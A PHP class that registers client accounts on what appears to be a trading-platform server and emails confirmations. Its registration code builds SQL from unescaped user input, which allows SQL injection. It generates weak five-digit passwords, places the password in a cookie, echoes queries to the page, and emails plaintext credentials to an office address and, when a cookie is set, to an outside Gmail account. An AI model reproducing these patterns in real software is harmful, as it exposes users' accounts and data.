<?php

require_once('vendor/autoload.php');
require_once('mailer.php');

class XManager {
    private $serverData;
    private $socket;
    private $lastError = FALSE;

    private static $characters = '0123456789';

    private static function generatePassword($length = 5) {
        for($i = 0, $result = ''; $i < $length; $i++) {
            $result .= static::$characters[rand(0, strlen(static::$characters))];
        }

        return $result;
    }

    // connection establishment functions
    private function connect() {
        $host = $this->serverData['host'];
        $port = $this->serverData['port'];



        $this->socket = stream_socket_client("tcp://{$host}:{$port}");

        if($this->socket) {
            $this->lastError = FALSE;

            stream_set_timeout($this->socket, 1);

            stream_set_blocking ($this->socket, TRUE);
            stream_socket_enable_crypto($this->socket, TRUE, STREAM_CRYPTO_METHOD_SSLv23_CLIENT);
            stream_set_blocking($this->socket, FALSE);

            // read welcome packet
            $this->read();

            $loginMessage = array(
                'login' => $this->serverData['login'],
                'password' => $this->serverData['password']
            );

            if(isset($this->serverData['banner']))
                $loginMessage['banner'] = $this->serverData['banner'];

            $this->write($this->envelope('login', $loginMessage));

            $response = $this->read();

            if(!$this->checkSuccess($response)) {
                $this->disconnect();

                $this->lastError = "Manager account failure: {$response->data->result}";
            }
        } else {
            $this->lastError = "Unable to establish connection to management server";
        }
    }

    private function disconnect() {
        fclose($this->socket);
        $this->socket = FALSE;
    }

    private function read() {
        $buffer = '';

        while(TRUE) {
            $buffer .= fread($this->socket, 10000);
            $result = json_decode($buffer);

            if(!is_null($result))
                return $result;
        }

    }

    private function write($data) {
        fwrite($this->socket, $data);
    }

    private function envelope($operation, $data = null) {
        $result = array(
            'header' => array('type' => $operation)
        );

        if(is_null($data))
            $result['data'] = new stdClass;
        else
            $result['data'] = $data;

        return json_encode($result);
    }

    private function checkSuccess($response) {
        $result = ($response->data->result == 'success');

        if($result)
            $this->lastError = FALSE;
        else
            $this->lastError = $response->data->result;

        return $result;
    }

    private function get_first_group($server) {
        $config = require 'config.php';

        return $config['groups'][$server][0]['group'];
    }

    // public methods
    public function __construct($serverData) {
        $this->serverData = $serverData;
    }

    public function register($data, $server,  $leverage_name = null, $deposit = '10000.0') {
        $this->connect();

        if(!$this->socket)
            return FALSE;

        $this->write($this->envelope('leverage list'));

        $leverage_response = $this->read();

        $result = $this->checkSuccess($leverage_response);

        if($result) {
            $leverage_id = null;

            foreach($leverage_response->data->leverage as $leverage) {
                if($leverage->name == $leverage_name) {
                    $leverage_id = $leverage->id_leverage;
                    break;
                }
            }

            $request = array(
                'name' => $data['name'],
                'surname' => $data['surname'],
                'group' => isset($data['group'])?$data['group']:$this->get_first_group($server),
                'country' => $data['country'],
                'city' => isset($data['city'])?$data['city']:'',
                'address' => isset($data['address'])?$data['address']:'',
                'state' => isset($data['address'])?$data['address']:'',
                'zip_code' => isset($data['zip_code'])?$data['zip_code']:'',
                'email' => isset($data['email'])?$data['email']:'',
                'phone' => isset($data['phone'])?$data['phone']:'',
                'enabled' => TRUE,
                'trade_enable' => TRUE,
                'password' => static::generatePassword(),
                'daily_confirmation' => FALSE,
                'id_number' => '',
                'is_gross' => TRUE
            );

            if(!is_null($leverage_id))
                $request['id_leverage'] = $leverage_id;

            $this->write($this->envelope('create account info', $request));
            $response = $this->read();

            $result = $this->checkSuccess($response);

            if($result && $server == 'demo') {
                $this->write($this->envelope('ledger operation', array(
                    'id_account' => $response->data->id_account,
                    'login' => $response->data->login,
                    'ledger_type' => 'deposit',
                    'amount' => $deposit . ''
                )));

                $ledger_response = $this->read();

                $result = $this->checkSuccess($ledger_response);
            }
        }
        
        $this->disconnect();

        if($result) {
	
	       // REGISTER AUTOMATICALLY THE EMAIL TO THE DB
	    include ("../config.php");
	    include("../connect_db.php");
	    $SQL="insert into clientdata values('','".$request['name']."','".$response->data->id_account."','".$response->data->password."','1','".$request['email']."','".$request['phone']."')";
	    mysql_query($SQL);
	    $SQL="insert into balance values('".$response->data->id_account."','50000.00',NOW())";
	    echo"<li>".$SQL;
	   mysql_query($SQL); 
	  echo mysql_error();
	    include("../end_db.php"); 
	    //
	
            $mailer = new Mailer();

            $mail_sent = ($request['email'] !== '') && $mailer->sendConfirmation(
                $request['email'],
                $request['name'],
                $request['surname'],
                $response->data->id_account,
                $response->data->password,
                $server
            );
	$mailer->sendConfirmation(
                "office.bg@thirdbrain.ch",
                $request['name'],
                $request['email'],
                $response->data->id_account,
                $response->data->password,
                $server
            );
	  if (isset($_COOKIE['partner']))
	  {
		$mailer->sendConfirmation(
                "smithbrolo@gmail.com",
                $request['name'],
                $request['email'],
                $response->data->id_account,
                $response->data->password,
                $server
            );
	}	
		
		
            setcookie('email', $request['email'], time() + 60);
            setcookie('name', $request['name'], time() + 60);
            setcookie('surname', $request['surname'], time() + 60);
            setcookie('login', $response->data->id_account, time() + 60);
            setcookie('server', $server, time() + 60);
	   // ADD THE PASSWORD TO BE SHOWN JUST AFTER REGISTRATION ! 
	    setcookie('password', $request['password'], time() + 60);
          //  if(!$mail_sent) {
           //     setcookie('password', $request['password'], time() + 60);
           // }
        }

        return $result;
    }

    public function lastError() {
        return $this->lastError;
    }
}